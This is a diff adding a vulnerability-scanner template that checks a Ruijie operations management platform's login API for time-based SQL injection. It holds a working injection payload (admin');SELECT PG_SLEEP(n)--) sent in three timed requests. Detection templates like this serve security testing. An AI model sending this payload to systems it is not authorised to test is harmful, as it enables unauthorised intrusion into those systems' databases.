@@ -1,0 +1,42 @@
+id: lxznyw-login-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 北京星网锐捷网络技术有限公司-乐享智能运维管理平台-SQL
+  reference:
+    - http://kpanda.wiki/#/../Vulnhub/B15-1%E5%8C%97%E4%BA%AC%E6%98%9F%E7%BD%91%E9%94%90%E6%8D%B7%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8-%E4%B9%90%E4%BA%AB%E6%99%BA%E8%83%BD%E8%BF%90%E7%BB%B4%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-SQL
+  tags: tags
+http:
+  - raw:
+      - |
+        POST /auth-ui/v1/api/user/token/getToken HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+        Accept: application/json, text/javascript, */*; q=0.01
+        Content-Length: 112
+
+        account=admin');SELECT PG_SLEEP(3)--&password=6e0f9e14344c5406a0cf5a3b4dfb665f87f4a771a31f7edbb5c72874a32b2957
+      - |
+        POST /auth-ui/v1/api/user/token/getToken HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+        Accept: application/json, text/javascript, */*; q=0.01
+        Content-Length: 112
+
+        account=admin');SELECT PG_SLEEP(6)--&password=6e0f9e14344c5406a0cf5a3b4dfb665f87f4a771a31f7edbb5c72874a32b2957
+      - |
+        POST /auth-ui/v1/api/user/token/getToken HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+        Accept: application/json, text/javascript, */*; q=0.01
+        Content-Length: 112
+
+        account=admin');SELECT PG_SLEEP(9)--&password=6e0f9e14344c5406a0cf5a3b4dfb665f87f4a771a31f7edbb5c72874a32b2957
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
